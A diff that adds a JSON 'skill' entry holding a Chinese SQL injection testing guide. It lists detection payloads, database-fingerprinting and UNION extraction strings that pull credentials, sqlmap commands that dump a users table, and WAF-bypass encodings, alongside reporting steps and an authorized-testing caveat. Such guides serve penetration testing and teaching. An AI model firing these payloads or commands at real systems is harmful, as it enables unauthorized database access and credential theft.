@@ -1,0 +1,12 @@
+{
+ "id": "sql-injection-testing",
+ "kind": "skill",
+ "name": "sql-injection-testing",
+ "fingerprint_md5": "a210860999dad9312874ba80f06d7755",
+ "download_count": 0,
+ "category": "数据库",
+ "tags": "",
+ "version": "",
+ "readme": "# SQL注入测试技能\r\n\r\n## 概述\r\n\r\nSQL注入是一种常见且危险的Web应用漏洞。本技能提供了系统化的SQL注入测试方法、检测技术和利用策略。\r\n\r\n## 测试方法\r\n\r\n### 1. 参数识别\r\n- 识别所有用户输入点：URL参数、POST数据、HTTP头、Cookie等\r\n- 重点关注：id、search、filter、sort等参数\r\n- 使用Burp Suite或类似工具拦截和修改请求\r\n\r\n### 2. 基础检测\r\n- 单引号测试：`'` - 查看是否出现SQL错误\r\n- 布尔盲注：`' AND '1'='1` vs `' AND '1'='2`\r\n- 时间盲注：`' AND SLEEP(5)--`\r\n- 联合查询：`' UNION SELECT NULL--`\r\n\r\n### 3. 数据库识别\r\n- MySQL：`' AND @@version LIKE '%mysql%'--`\r\n- PostgreSQL：`' AND version() LIKE '%PostgreSQL%'--`\r\n- MSSQL：`' AND @@version LIKE '%Microsoft%'--`\r\n- Oracle：`' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`\r\n\r\n### 4. 信息提取\r\n- 数据库名：`' UNION SELECT database()--`\r\n- 表名：`' UNION SELECT table_name FROM information_schema.tables--`\r\n- 列名：`' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`\r\n- 数据提取：`' UNION SELECT username,password FROM users--`\r\n\r\n## 工具使用\r\n\r\n### sqlmap\r\n```bash\r\n# 基础扫描\r\nsqlmap -u \"http://target.com/page?id=1\"\r\n\r\n# 指定参数\r\nsqlmap -u \"http://target.com/page\" --data=\"id=1\" --method=POST\r\n\r\n# 指定数据库类型\r\nsqlmap -u \"http://target.com/page?id=1\" --dbms=mysql\r\n\r\n# 获取数据库列表\r\nsqlmap -u \"http://target.com/page?id=1\" --dbs\r\n\r\n# 获取表\r\nsqlmap -u \"http://target.com/page?id=1\" -D database_name --tables\r\n\r\n# 获取数据\r\nsqlmap -u \"http://target.com/page?id=1\" -D database_name -T users --dump\r\n```\r\n\r\n### 手动测试\r\n- 使用Burp Suite的Repeater模块\r\n- 使用浏览器开发者工具\r\n- 编写Python脚本自动化测试\r\n\r\n## 绕过技术\r\n\r\n### WAF绕过\r\n- 编码绕过：URL编码、Unicode编码、十六进制编码\r\n- 注释绕过：`/**/`, `--`, `#`\r\n- 大小写混合：`SeLeCt`, `UnIoN`\r\n- 空格替换：`/**/`, `+`, `%09`(Tab), `%0A`(换行)\r\n\r\n### 示例\r\n```\r\n原始：' UNION SELECT NULL--\r\n绕过1：'/**/UNION/**/SELECT/**/NULL--\r\n绕过2：'%55nion%20select%20null--\r\n绕过3：'/*!UNION*//*!SELECT*/null--\r\n```\r\n\r\n## 验证和报告\r\n\r\n### 验证步骤\r\n1. 确认可以执行SQL语句\r\n2. 提取数据库信息验证\r\n3. 评估影响范围（数据泄露、权限提升等）\r\n4. 记录完整的POC（请求/响应）\r\n\r\n### 报告要点\r\n- 漏洞位置和参数\r\n- 影响的数据和系统\r\n- 完整的利用步骤\r\n- 修复建议（参数化查询、输入验证等）\r\n\r\n## 注意事项\r\n\r\n- 仅在授权测试环境中进行\r\n- 避免对生产数据造成破坏\r\n- 谨慎使用DROP、DELETE等危险操作\r\n- 记录所有测试步骤以便复现",
+ "config": {}
+}
